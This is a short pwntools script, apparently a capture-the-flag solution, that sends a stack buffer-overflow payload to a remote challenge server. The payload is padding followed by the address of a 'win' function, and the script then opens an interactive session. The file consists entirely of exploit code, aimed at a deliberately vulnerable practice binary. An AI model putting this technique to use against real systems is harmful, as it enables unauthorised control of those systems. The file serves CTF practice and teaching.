from pwn import *


context.binary =elf =ELF('./chall')
context.log_level='debug'

#p = process()
p = remote('time-traveler.hackini24.shellmates.club',443,ssl=True)
p.recv()

payload =flat(
	b'a'*16
	,elf.symbols['win']
	,0xb
	,elf.symbols['win']
	,b'c'*16
	)
	
	
write('payload',payload)

p.sendline(payload)


p.interactive()
